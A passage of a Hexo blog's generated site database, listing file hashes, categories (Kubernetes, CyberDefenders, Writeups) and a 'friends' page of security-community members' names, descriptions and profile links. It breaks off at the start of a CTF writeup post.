035","modified":1679592909818},{"_id":"themes/shoka/source/css/_common/outline/sidebar/social.styl","hash":"33f6459f44e15ef3320e3b208e5345ff1d0cee5f","modified":1679592909818},{"_id":"themes/shoka/source/css/_common/outline/sidebar/state.styl","hash":"c2eaaba4c35df5253ae236318b5e6f76861d37f8","modified":1679592909818},{"_id":"themes/shoka/source/css/_common/outline/sidebar/toc.styl","hash":"5836be92d4d153bd44ff86fe05e0ce83b11ae569","modified":1679592909818},{"_id":"themes/shoka/example/source/_posts/computer-science/java/course-1/cover.jpg","hash":"57341ddf90eeb71d0b9a3fef8cf1f094f9c299b3","modified":1679592909778},{"_id":"themes/shoka/example/source/_posts/computer-science/java/course-1/week-1.md","hash":"8284465659be7a4b7568244264bc236c01a6d1cb","modified":1679592909778},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/dependents.md","hash":"5048e40092f39f776060e083c822698e5842a3ea","modified":1679592909778},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/config.md","hash":"19c4015857b6953da18628967b7a0b84e624a43d","modified":1679592909778},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/display.md","hash":"fce410e8e5756ea256c6a23ee688455bb8d51e93","modified":1679592909778},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/special.md","hash":"3c0c0bf6b7cd1ab3c12e0d097330937a2803ed10","modified":1679592909778},{"_id":"themes/shoka/example/source/_posts/computer-science/java/course-1/week-2.md","hash":"5efffda6c8abc24a1d4671c54928cfe7fb838ce5","modified":1679592909778},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/class.styl","hash":"0d9b0d1d2ecf981b881e9416fc770d47f679a50f","modified":1679592909808},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/flowchart.styl","hash":"83296761c85b8e82d0757b1a4792a74d50509d2d","modified":1679592909808},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/gantt.styl","hash":"bae6617a32026891f510483aa6d25c70a82c5945","modified":1679592909808},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/sequence.styl","hash":"7e91e07c39e1c1343626c8d5b9fecfebc6c086f6","modified":1679592909808},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/git.styl","hash":"a7e5f3bb9378b1a4fb0f710e28a02fd4fd1b3040","modified":1679592909808},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/mermaid.styl","hash":"e54378b88ce839626bdbcb00676d79dbe70a742c","modified":1679592909808},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/pie.styl","hash":"bce4029a87d60ba40ff4faadb9d95c76b824141a","modified":1679592909808},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/state.styl","hash":"83d21d840bd2bc4249e2dced49efe8cef2281f05","modified":1679592909808},{"_id":"themes/shoka/source/images/paypal.png","hash":"449c419f6b4f1b8d70b5797f8f98b33184e7c21a","modified":1679592909828},{"_id":"themes/shoka/source/images/tobi.jpg","hash":"3082bec97f561161ce28ce9dfa66c34f33d4a95c","modified":1679592909828},{"_id":"source/_posts/CyberDefenders/2022-09-08-16-07-03.png","hash":"a4c8b84339dffd2c74ff89b993cba8f8981fd3ca","modified":1679592909768},{"_id":"themes/shoka/example/source/assets/wallpaper-2572384.jpg","hash":"1df3620ab8c69fe2498a746f8ead057162df0637","modified":1679592909788},{"_id":"source/_posts/Writeups/cover.jpg","hash":"cf9562bf369869ba8892e0c9261465e41f088e77","modified":1679592909768},{"_id":"themes/shoka/screenshot.png","hash":"676ab8bfe3fa106e5b88617ab377cd6b438cc0d9","modified":1679592909798},{"_id":"themes/shoka/example/source/assets/wallpaper-878514.jpg","hash":"9f9705a377c42320b335b3c66b023e62b80e56e3","modified":1679592909788},{"_id":"themes/shoka/example/source/assets/wallpaper-2311325.jpg","hash":"ddaaaeb4fa04a05c83053c1f8149720d18c9c8de","modified":1679592909788},{"_id":"public/rss.xml","hash":"fa644009a1027a035e1ff02b1ffcb515512ac159","modified":1680447032586},{"_id":"public/tag/kubernetes/rss.xml","hash":"506146f2c08210078e4dd06562ee7f1ab4aec359","modified":1680447032586},{"_id":"public/category/kubernetes/rss.xml","hash":"78f3d94e2bcec44db4b0e444c075b6011cbe6a4e","modified":1680447032586},{"_id":"public/category/cyberdefenders/rss.xml","hash":"cb29a8ce6998fafe28d56126823321cc7d1e0590","modified":1680447032586},{"_id":"public/category/writeups/rss.xml","hash":"57ba8d521265561e8cb215e2cdb57052f003c9af","modified":1680447032586},{"_id":"public/atom.xml","hash":"3fd0031735424e58e280b9ba952c89a4b72aec2e","modified":1680447032586},{"_id":"public/tag/kubernetes/atom.xml","hash":"4cf5ae97a72f658a57ceceb9b445bad2ed77c1b5","modified":1680447032586},{"_id":"public/category/kubernetes/atom.xml","hash":"16d57dcc8ca1e170562eafb4c5fe792e055c1832","modified":1680447032586},{"_id":"public/category/cyberdefenders/atom.xml","hash":"dc18d7ebb9ce585e7e8354c2e989ba8f24d8b2d0","modified":1680447032586},{"_id":"public/category/writeups/atom.xml","hash":"cf54ec43168b4f98190c459cb28a06e80ff1bc84","modified":1680447032586},{"_id":"public/feed.json","hash":"b9cec5433a74a16a98e9df35b52a248e8f7327f0","modified":1680447032586},{"_id":"public/tag/kubernetes/feed.json","hash":"6d0247a5dbe1709f3b9c1ba4146a902f9110fd93","modified":1680447032586},{"_id":"public/category/kubernetes/feed.json","hash":"aec1263635b7d91efb8c5d14f3f32b1ecafa83a7","modified":1680447032586},{"_id":"public/category/cyberdefenders/feed.json","hash":"069527e5101fcfb6ce58655ebbb6cfeffb1d348a","modified":1680447032586},{"_id":"public/category/writeups/feed.json","hash":"f50112c518b520d65a131e38156ca3ca3e8e2f94","modified":1680447032586},{"_id":"public/friends/index.html","hash":"0b1af4ab579004ce95d2aa86b40f60fa12814a39","modified":1680447032586},{"_id":"public/archives/index.html","hash":"d0af41e72348c5d80fb54bcafb37247688b9d719","modified":1680447032586},{"_id":"public/archives/2022/index.html","hash":"8772dbb35cf2a34a271133fd08fa104cf5557907","modified":1680447032586},{"_id":"public/archives/2022/page/2/index.html","hash":"49aad6ae7ba54f090776615e28127aa2cd2c5a00","modified":1680447032586},{"_id":"public/archives/2022/08/index.html","hash":"59d37a3f96f3ca7fafbae895e9d3ba9ddaa5fb38","modified":1680447032586},{"_id":"public/archives/2022/09/index.html","hash":"4b817e4f58f9a823f5bca399a036625074b93ff9","modified":1680447032586},{"_id":"public/archives/2022/09/page/2/index.html","hash":"fc283f233e0b613b7de86d594222f843aa2305f4","modified":1680447032586},{"_id":"public/archives/2023/index.html","hash":"a49a350abaaf96ec84e558ed07886e516fb1d5df","modified":1680447032586},{"_id":"public/archives/2023/03/index.html","hash":"63ff504294f00499d6fcb509ff340e5cb486935a","modified":1680447032586},{"_id":"public/categories/Kubernetes/index.html","hash":"bb0fd8249a35ff058a1bc8428fd33f2048186518","modified":1680447032586},{"_id":"public/categories/CyberDefenders/index.html","hash":"1596a75af07635d8c6005d50085f572a1a762d6b","modified":1680447032586},{"_id":"public/categories/Writeups/index.html","hash":"76566055c3bd3338c69b60db3984b0acb5e8ce46","modified":1680447032586},{"_id":"public/page/3/index.html","hash":"1f271d6525a402c2ae283fd7b01d63b7f5e0cbe7","modified":1680447032586},{"_id":"public/tags/kubernetes/index.html","hash":"68e89158a9c1b5640d77eaf0ca25f03d720956a6","modified":1680447032586},{"_id":"public/categories/index.html","hash":"6ac2f453487ea4b097931bbc30a376c70a99ece3","modified":1680447032586},{"_id":"public/tags/index.html","hash":"091c975a45aa8bc28cde318ee2b41ceacb2578fc","modified":1680447032586},{"_id":"public/404.html","hash":"f1beb4f2d2125d9aa6077b9cd6d31e3a924d8799","modified":1680447032586},{"_id":"public/js/app.js","hash":"8fdef166cea7f5b587b37d843ccf8b6c480701ae","modified":1680447032586},{"_id":"public/2023/03/23/Writeups/ncsc2023/index.html","hash":"f460cc894406f974ce25ea3e39559cc5fcdef25b","modified":1680447032586},{"_id":"public/2022/09/12/Writeups/csaw2022/index.html","hash":"c8cc25625425385ace61bf2e714c790bdb0f96e6","modified":1680447032586},{"_id":"public/2022/09/10/Kubernetes/nfs-k8s/index.html","hash":"56f16a884199521d11ee47ceefed4d43d0dfdab0","modified":1680447032586},{"_id":"public/2022/09/09/Kubernetes/nginx-ingress/index.html","hash":"0085c4e5ac927483c0d848bef4e3ed7c546574b9","modified":1680447032586},{"_id":"public/2022/09/09/CyberDefenders/affrica-falls/index.html","hash":"7267646fc397293c783911148b4b84e0b0a63b5d","modified":1680447032586},{"_id":"public/2022/09/08/Kubernetes/private-docker-k8s/index.html","hash":"03a804558ec094ab03b5ba03f17ad32904f26c19","modified":1680447032586},{"_id":"public/2022/09/07/CyberDefenders/EscapeRoom/index.html","hash":"4fd2a5c1c1d8684a897dcd3c4b2da5a18ec6e279","modified":1680447032586},{"_id":"public/2022/09/06/CyberDefenders/brave/index.html","hash":"e9d57c5be8f57db89c26bf7e8ea02dcbb149147f","modified":1680447032586},{"_id":"public/2022/09/06/Kubernetes/configmap-secrets/index.html","hash":"389173164b1e21737e13419ee0322cee3620ade1","modified":1680447032586},{"_id":"public/2022/09/05/CyberDefenders/Phishy/index.html","hash":"1362c5ca6c85d0f3ce92722dc2ac5e7819ab0bb3","modified":1680447032586},{"_id":"public/2022/08/05/Kubernetes/kubeadm/index.html","hash":"ffe96cdec96336d2c10b33108982f8b3eb98ede9","modified":1680447032586},{"_id":"public/index.html","hash":"784b7a06badacd7abbd3888b2a5d719e143c9c38","modified":1680447032586},{"_id":"public/page/2/index.html","hash":"28a3b1b9f94ad0502f2eb91a7a37aa77f7856434","modified":1680447032586},{"_id":"public/CNAME","hash":"c2d257532893cae7d53324b4484f302558f2ed29","modified":1680447032586},{"_id":"public/images/404.png","hash":"b7b18f6689d0a14041d87bab6c4e4ce567249d01","modified":1680447032586},{"_id":"public/images/algolia_logo.svg","hash":"45eeea0b5fba833e21e38ea10ed5ab385ceb4f01","modified":1680447032586},{"_id":"public/images/apple-touch-icon.png","hash":"d4e5d65ff663cb71f43515e68d757cbae1ceb3ec","modified":1680447032586},{"_id":"public/images/avatar.jpg","hash":"93af0fd2ee6322c5c77760eefba6c81afa2e313e","modified":1680447032586},{"_id":"public/images/logo.svg","hash":"830dfbd6dff2986130819f747b25db230b05ca84","modified":1680447032586},{"_id":"public/images/play_needle.png","hash":"e0998828ab50ce37617f9f4d46b74648206ac852","modified":1680447032586},{"_id":"public/images/alipay.png","hash":"013436bac325a3a0c2c9b13a08312fc4e7025d69","modified":1680447032586},{"_id":"public/images/search.png","hash":"08c4f6a7a92eff3548aec94b267a23a25e6bd215","modified":1680447032586},{"_id":"public/images/play_disc.png","hash":"3cfa8dd2e12424c52d1f5e34e9502e446fecde9c","modified":1680447032586},{"_id":"public/images/wechatpay.png","hash":"470a42ee16dd516580d5e51607f11dc353a49675","modified":1680447032586},{"_id":"public/images/paypal.png","hash":"449c419f6b4f1b8d70b5797f8f98b33184e7c21a","modified":1680447032586},{"_id":"public/CyberDefenders/cover.jpg","hash":"b31367838ba199fcc6a70324e9d29f6966823cfa","modified":1680447032586},{"_id":"public/Kubernetes/cover.jpg","hash":"c284fac8668bc974d82049ecbc76f6727a7b7ad5","modified":1680447032586},{"_id":"public/css/comment.css","hash":"02095bbceb2776977774348a2f347a7995b19327","modified":1680447032586},{"_id":"public/css/mermaid.css","hash":"3fe1b97a64b969d4d7a470a4929cb432afefd1bd","modified":1680447032586},{"_id":"public/css/app.css","hash":"366cf421674686c94fd592a66189fa232862df2b","modified":1680447032586},{"_id":"public/images/tobi.jpg","hash":"3082bec97f561161ce28ce9dfa66c34f33d4a95c","modified":1680447032586},{"_id":"public/Writeups/cover.jpg","hash":"cf9562bf369869ba8892e0c9261465e41f088e77","modified":1680447032586},{"_id":"source/_posts/Kubernetes/k8s-auth.md","hash":"9d3c0b59d28a259aafc64c65c074a842099537c1","modified":1682787493575},{"_id":"source/_posts/auth.md","hash":"6923955c11da3b373318d6f8c01254f019fdbd7c","modified":1682778440558},{"_id":"source/_posts/Kubernetes/2023-04-29-15-56-38.png","hash":"f5199ace4d591d0ed48aad008a9283cef400be06","modified":1682780199623},{"_id":"source/_posts/Kubernetes/2023-04-29-16-08-58.png","hash":"078657bcd9622883ff59e30c659b6519535cfff1","modified":1682780938802}],"Category":[{"name":"Kubernetes","_id":"clfzirxn80005d5qf4m1rg9ls"},{"name":"CyberDefenders","_id":"clfzirxnc0008d5qfbvksfp9r"},{"name":"Writeups","_id":"clfzirxny000vd5qfgqe22qxz"}],"Data":[],"Page":[{"title":"Blogs Of Our Friends","date":"2022-09-15T12:55:57.000Z","_content":"{% links %}\n- site: Anas Cherni - n0s\n  url: https://anas-cherni.me/\n  desc: Professional Web pentester\n  image: https://media.licdn.com/dms/image/C4D03AQF9Nc58-THTtg/profile-displayphoto-shrink_800_800/0/1663873833507?e=1686182400&v=beta&t=YuU2iXHnwWyK6in6nercVN9NgFPn5n8HDCTLNOhWkLU\n  color: \"#2296fd\"\n- site: Yassine Belkhadem - F1r3Cr4CK3r5\n  desc: CTF write ups | Web3 | Web Attacks | UI/UX\n  url: https://www.yassinebelkhadem.ninja/\n  image: https://media.licdn.com/dms/image/C5603AQHEm0AAAYFLMw/profile-displayphoto-shrink_800_800/0/1635092972861?e=1686182400&v=beta&t=SZ9CDP07O_W5ZcOeNkTXrewT4Lf_J9QPCgIA4ZMOCic\n  color: \"#de2336\"\n- site: Med Ali Ouachani - IR0NBYTE\n  desc: Competetive Programmer | Reverse Engineer\n  url: https://ironbyte.me/\n  image: https://media.licdn.com/dms/image/D4D03AQFOKVL6P8MiGw/profile-displayphoto-shrink_800_800/0/1671909496742?e=1686182400&v=beta&t=IxZV4QtI8CPaF2IGieaPI7o0lafIe1pS6lLmL2LstW4\n  color: \"#02bf1b\"\n- site: Rania Midaoui - Mida0ui\n  desc: Binary Exploitation | SysAdmin | OSINT | MISC\n  url: https://www.linkedin.com/in/rania-midaoui-b0163a1bb/\n  image: https://media.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1686182400&v=beta&t=Ub5xJZEwwWFXVAK1L66vMOIkLJVvzZrEfuUq3DrrTKs\n  color: \"#ff0378\"\n  \n- site: NieMand \n  desc: Web3 Developer | DevOps & Infra Guru\n  url: https://www.hmlndr.me\n  image: https://pbs.twimg.com/profile_images/1607462313182756867/WHEAVH9d_400x400.jpg\n  color: \"#de2336\"\n\n- site: Yassine Belarbi | SSONEDE\n  desc: Crypto Hacker | CTF Player\n  url: https://github.com/yassine258\n  image: https://avatars.githubusercontent.com/u/76777840?v=4\n  color: \"#ffea00\"\n\n- site: Med Mongi Saidane | M0ngi\n  desc: Hacker.\n  url: https://github.com/M0ngi\n  image: https://media.licdn.com/dms/image/D4E03AQEklYO57f843w/profile-displayphoto-shrink_800_800/0/1664393057972?e=1686182400&v=beta&t=ZAeL2hzTA0N0C8UaWP_3HcLj88-z_znuRjuoYYNJ2Wc\n  color: \"#3c4a44\"\n\n- site: Med Ayadi | Ayadinou\n  desc: Reverse Engineering | DevOps | SysAdmin\n  url: https://github.com/ayadi-mohamed\n  image: https://media.licdn.com/dms/image/D4D03AQEpsqzJb3o_Gg/profile-displayphoto-shrink_800_800/0/1676400655063?e=1686182400&v=beta&t=7vObbcwT35iidkbmbMZyE-tOI7VY8dmvi0VvJ5Rkcc8\n  color: \"#c300ff\"\n{% endlinks %}\n","source":"friends/index.md","raw":"---\ntitle: Blogs Of Our Friends \ndate: 2022-09-15 13:55:57\n---\n{% links %}\n- site: Anas Cherni - n0s\n  url: https://anas-cherni.me/\n  desc: Professional Web pentester\n  image: https://media.licdn.com/dms/image/C4D03AQF9Nc58-THTtg/profile-displayphoto-shrink_800_800/0/1663873833507?e=1686182400&v=beta&t=YuU2iXHnwWyK6in6nercVN9NgFPn5n8HDCTLNOhWkLU\n  color: \"#2296fd\"\n- site: Yassine Belkhadem - F1r3Cr4CK3r5\n  desc: CTF write ups | Web3 | Web Attacks | UI/UX\n  url: https://www.yassinebelkhadem.ninja/\n  image: https://media.licdn.com/dms/image/C5603AQHEm0AAAYFLMw/profile-displayphoto-shrink_800_800/0/1635092972861?e=1686182400&v=beta&t=SZ9CDP07O_W5ZcOeNkTXrewT4Lf_J9QPCgIA4ZMOCic\n  color: \"#de2336\"\n- site: Med Ali Ouachani - IR0NBYTE\n  desc: Competetive Programmer | Reverse Engineer\n  url: https://ironbyte.me/\n  image: https://media.licdn.com/dms/image/D4D03AQFOKVL6P8MiGw/profile-displayphoto-shrink_800_800/0/1671909496742?e=1686182400&v=beta&t=IxZV4QtI8CPaF2IGieaPI7o0lafIe1pS6lLmL2LstW4\n  color: \"#02bf1b\"\n- site: Rania Midaoui - Mida0ui\n  desc: Binary Exploitation | SysAdmin | OSINT | MISC\n  url: https://www.linkedin.com/in/rania-midaoui-b0163a1bb/\n  image: https://media.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1686182400&v=beta&t=Ub5xJZEwwWFXVAK1L66vMOIkLJVvzZrEfuUq3DrrTKs\n  color: \"#ff0378\"\n  \n- site: NieMand \n  desc: Web3 Developer | DevOps & Infra Guru\n  url: https://www.hmlndr.me\n  image: https://pbs.twimg.com/profile_images/1607462313182756867/WHEAVH9d_400x400.jpg\n  color: \"#de2336\"\n\n- site: Yassine Belarbi | SSONEDE\n  desc: Crypto Hacker | CTF Player\n  url: https://github.com/yassine258\n  image: https://avatars.githubusercontent.com/u/76777840?v=4\n  color: \"#ffea00\"\n\n- site: Med Mongi Saidane | M0ngi\n  desc: Hacker.\n  url: https://github.com/M0ngi\n  image: https://media.licdn.com/dms/image/D4E03AQEklYO57f843w/profile-displayphoto-shrink_800_800/0/1664393057972?e=1686182400&v=beta&t=ZAeL2hzTA0N0C8UaWP_3HcLj88-z_znuRjuoYYNJ2Wc\n  color: \"#3c4a44\"\n\n- site: Med Ayadi | Ayadinou\n  desc: Reverse Engineering | DevOps | SysAdmin\n  url: https://github.com/ayadi-mohamed\n  image: https://media.licdn.com/dms/image/D4D03AQEpsqzJb3o_Gg/profile-displayphoto-shrink_800_800/0/1676400655063?e=1686182400&v=beta&t=7vObbcwT35iidkbmbMZyE-tOI7VY8dmvi0VvJ5Rkcc8\n  color: \"#c300ff\"\n{% endlinks %}\n","updated":"2023-04-02T14:46:41.980Z","path":"friends/index.html","comments":1,"layout":"page","_id":"clfzirxmr0000d5qfbfn28ce4","content":"<div class=\"links\"><div class=\"item\" title=\"Anas Cherni - n0s\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9hbmFzLWNoZXJuaS5tZS8=\" data-background-image=\"https://media.licdn.com/dms/image/C4D03AQF9Nc58-THTtg/profile-displayphoto-shrink_800_800/0/1663873833507?e=1686182400&v=beta&t=YuU2iXHnwWyK6in6nercVN9NgFPn5n8HDCTLNOhWkLU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9hbmFzLWNoZXJuaS5tZS8=\">Anas Cherni - n0s</span>\n          <p class=\"desc\">Professional Web pentester</p>\n          </div></div><div class=\"item\" title=\"Yassine Belkhadem - F1r3Cr4CK3r5\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cueWFzc2luZWJlbGtoYWRlbS5uaW5qYS8=\" data-background-image=\"https://media.licdn.com/dms/image/C5603AQHEm0AAAYFLMw/profile-displayphoto-shrink_800_800/0/1635092972861?e=1686182400&v=beta&t=SZ9CDP07O_W5ZcOeNkTXrewT4Lf_J9QPCgIA4ZMOCic\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cueWFzc2luZWJlbGtoYWRlbS5uaW5qYS8=\">Yassine Belkhadem - F1r3Cr4CK3r5</span>\n          <p class=\"desc\">CTF write ups | Web3 | Web Attacks | UI/UX</p>\n          </div></div><div class=\"item\" title=\"Med Ali Ouachani - IR0NBYTE\" style=\"--block-color:#02bf1b;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9pcm9uYnl0ZS5tZS8=\" data-background-image=\"https://media.licdn.com/dms/image/D4D03AQFOKVL6P8MiGw/profile-displayphoto-shrink_800_800/0/1671909496742?e=1686182400&v=beta&t=IxZV4QtI8CPaF2IGieaPI7o0lafIe1pS6lLmL2LstW4\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9pcm9uYnl0ZS5tZS8=\">Med Ali Ouachani - IR0NBYTE</span>\n          <p class=\"desc\">Competetive Programmer | Reverse Engineer</p>\n          </div></div><div class=\"item\" title=\"Rania Midaoui - Mida0ui\" style=\"--block-color:#ff0378;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\" data-background-image=\"https://media.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1686182400&v=beta&t=Ub5xJZEwwWFXVAK1L66vMOIkLJVvzZrEfuUq3DrrTKs\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\">Rania Midaoui - Mida0ui</span>\n          <p class=\"desc\">Binary Exploitation | SysAdmin | OSINT | MISC</p>\n          </div></div><div class=\"item\" title=\"NieMand\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cuaG1sbmRyLm1l\" data-background-image=\"https://pbs.twimg.com/profile_images/1607462313182756867/WHEAVH9d_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cuaG1sbmRyLm1l\">NieMand</span>\n          <p class=\"desc\">Web3 Developer | DevOps & Infra Guru</p>\n          </div></div><div class=\"item\" title=\"Yassine Belarbi | SSONEDE\" style=\"--block-color:#ffea00;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lhc3NpbmUyNTg=\" data-background-image=\"https://avatars.githubusercontent.com/u/76777840?v=4\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lhc3NpbmUyNTg=\">Yassine Belarbi | SSONEDE</span>\n          <p class=\"desc\">Crypto Hacker | CTF Player</p>\n          </div></div><div class=\"item\" title=\"Med Mongi Saidane | M0ngi\" style=\"--block-color:#3c4a44;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL00wbmdp\" data-background-image=\"https://media.licdn.com/dms/image/D4E03AQEklYO57f843w/profile-displayphoto-shrink_800_800/0/1664393057972?e=1686182400&v=beta&t=ZAeL2hzTA0N0C8UaWP_3HcLj88-z_znuRjuoYYNJ2Wc\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL00wbmdp\">Med Mongi Saidane | M0ngi</span>\n          <p class=\"desc\">Hacker.</p>\n          </div></div><div class=\"item\" title=\"Med Ayadi | Ayadinou\" style=\"--block-color:#c300ff;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F5YWRpLW1vaGFtZWQ=\" data-background-image=\"https://media.licdn.com/dms/image/D4D03AQEpsqzJb3o_Gg/profile-displayphoto-shrink_800_800/0/1676400655063?e=1686182400&v=beta&t=7vObbcwT35iidkbmbMZyE-tOI7VY8dmvi0VvJ5Rkcc8\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F5YWRpLW1vaGFtZWQ=\">Med Ayadi | Ayadinou</span>\n          <p class=\"desc\">Reverse Engineering | DevOps | SysAdmin</p>\n          </div></div></div>\n","site":{"data":{}},"length":378,"excerpt":"","more":"<div class=\"links\"><div class=\"item\" title=\"Anas Cherni - n0s\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9hbmFzLWNoZXJuaS5tZS8=\" data-background-image=\"https://media.licdn.com/dms/image/C4D03AQF9Nc58-THTtg/profile-displayphoto-shrink_800_800/0/1663873833507?e=1686182400&v=beta&t=YuU2iXHnwWyK6in6nercVN9NgFPn5n8HDCTLNOhWkLU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9hbmFzLWNoZXJuaS5tZS8=\">Anas Cherni - n0s</span>\n          <p class=\"desc\">Professional Web pentester</p>\n          </div></div><div class=\"item\" title=\"Yassine Belkhadem - F1r3Cr4CK3r5\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cueWFzc2luZWJlbGtoYWRlbS5uaW5qYS8=\" data-background-image=\"https://media.licdn.com/dms/image/C5603AQHEm0AAAYFLMw/profile-displayphoto-shrink_800_800/0/1635092972861?e=1686182400&v=beta&t=SZ9CDP07O_W5ZcOeNkTXrewT4Lf_J9QPCgIA4ZMOCic\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cueWFzc2luZWJlbGtoYWRlbS5uaW5qYS8=\">Yassine Belkhadem - F1r3Cr4CK3r5</span>\n          <p class=\"desc\">CTF write ups | Web3 | Web Attacks | UI/UX</p>\n          </div></div><div class=\"item\" title=\"Med Ali Ouachani - IR0NBYTE\" style=\"--block-color:#02bf1b;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9pcm9uYnl0ZS5tZS8=\" data-background-image=\"https://media.licdn.com/dms/image/D4D03AQFOKVL6P8MiGw/profile-displayphoto-shrink_800_800/0/1671909496742?e=1686182400&v=beta&t=IxZV4QtI8CPaF2IGieaPI7o0lafIe1pS6lLmL2LstW4\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9pcm9uYnl0ZS5tZS8=\">Med Ali Ouachani - IR0NBYTE</span>\n          <p class=\"desc\">Competetive Programmer | Reverse Engineer</p>\n          </div></div><div class=\"item\" title=\"Rania Midaoui - Mida0ui\" style=\"--block-color:#ff0378;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\" data-background-image=\"https://media.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1686182400&v=beta&t=Ub5xJZEwwWFXVAK1L66vMOIkLJVvzZrEfuUq3DrrTKs\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\">Rania Midaoui - Mida0ui</span>\n          <p class=\"desc\">Binary Exploitation | SysAdmin | OSINT | MISC</p>\n          </div></div><div class=\"item\" title=\"NieMand\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cuaG1sbmRyLm1l\" data-background-image=\"https://pbs.twimg.com/profile_images/1607462313182756867/WHEAVH9d_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cuaG1sbmRyLm1l\">NieMand</span>\n          <p class=\"desc\">Web3 Developer | DevOps & Infra Guru</p>\n          </div></div><div class=\"item\" title=\"Yassine Belarbi | SSONEDE\" style=\"--block-color:#ffea00;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lhc3NpbmUyNTg=\" data-background-image=\"https://avatars.githubusercontent.com/u/76777840?v=4\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lhc3NpbmUyNTg=\">Yassine Belarbi | SSONEDE</span>\n          <p class=\"desc\">Crypto Hacker | CTF Player</p>\n          </div></div><div class=\"item\" title=\"Med Mongi Saidane | M0ngi\" style=\"--block-color:#3c4a44;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL00wbmdp\" data-background-image=\"https://media.licdn.com/dms/image/D4E03AQEklYO57f843w/profile-displayphoto-shrink_800_800/0/1664393057972?e=1686182400&v=beta&t=ZAeL2hzTA0N0C8UaWP_3HcLj88-z_znuRjuoYYNJ2Wc\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL00wbmdp\">Med Mongi Saidane | M0ngi</span>\n          <p class=\"desc\">Hacker.</p>\n          </div></div><div class=\"item\" title=\"Med Ayadi | Ayadinou\" style=\"--block-color:#c300ff;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F5YWRpLW1vaGFtZWQ=\" data-background-image=\"https://media.licdn.com/dms/image/D4D03AQEpsqzJb3o_Gg/profile-displayphoto-shrink_800_800/0/1676400655063?e=1686182400&v=beta&t=7vObbcwT35iidkbmbMZyE-tOI7VY8dmvi0VvJ5Rkcc8\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F5YWRpLW1vaGFtZWQ=\">Med Ayadi | Ayadinou</span>\n          <p class=\"desc\">Reverse Engineering | DevOps | SysAdmin</p>\n          </div></div></div>\n"}],"Post":[{"title":"CyberDefenders Writeup  Pwned-DC","_content":"\nThis CTF challenge is about retrieving data from a 